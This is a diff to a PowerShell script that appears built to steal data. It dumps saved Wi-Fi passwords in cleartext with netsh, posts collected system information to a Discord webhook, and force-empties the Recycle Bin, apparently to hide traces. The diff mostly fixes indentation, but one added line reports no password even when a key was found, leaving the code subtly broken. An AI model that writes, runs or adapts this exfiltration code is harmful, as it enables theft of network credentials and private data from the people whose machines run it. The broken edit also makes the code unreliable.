@@ -31,7 +31,9 @@ function Get-WifiPasswords {
             $profile = $matches[1].Trim()
             $keyContent = netsh wlan show profile "$profile" key=clear | Select-String "Key Content"
             if ($keyContent) {
-                "$profile: $($keyContent -replace 'Key Content\s*:\s*', '')"
+              "${profile}: $($keyContent -replace 'Key Content\s*:\s*', '')"
+            "${profile}: No password found or access denied"
+
             } else {
                 "$profile: No password found or access denied"
             }
@@ -83,7 +85,7 @@ function Send-ToDiscord {
 
     try {
         Invoke-RestMethod -Uri $DiscordWebhookUrl -Method Post -ContentType 'application/json' -Body $payload
-Write-Host "Sending System Info directly to Discord."
+        Write-Host "Sending System Info directly to Discord."
 
     } catch {
         Write-Error "Failed to send data to Discord."
@@ -102,4 +104,5 @@ Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 # Signal Completion
 $done = New-Object -ComObject Wscript.Shell
 $done.Popup("Script execution complete", 1)
+
 
